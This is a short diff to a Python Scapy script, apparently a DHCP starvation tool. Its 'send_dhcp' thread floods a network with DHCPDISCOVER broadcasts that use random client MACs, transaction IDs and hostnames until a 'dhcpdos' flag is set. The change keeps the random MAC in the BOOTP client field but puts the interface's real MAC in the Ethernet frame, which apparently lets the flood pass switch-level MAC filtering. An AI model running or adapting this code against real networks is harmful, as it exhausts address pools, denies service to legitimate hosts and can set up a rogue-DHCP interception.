@@ -157,9 +157,10 @@ class send_dhcp(threading.Thread):
      global timer,dhcpdos
      while not self.kill_received and not dhcpdos:
        m=randomMAC()
+       m1=str2mac(get_if_raw_hwaddr(interface)[1])
        myxid=random.randint(1, 900000000)
        hostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
-       dhcp_discover =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid)/DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
+       dhcp_discover =  Ether(src=m1,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid)/DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
        print "\n\n\nSending DHCPDISCOVER on " + interface
        sendp(dhcp_discover,verbose=0,iface=interface)
        time.sleep(timer)
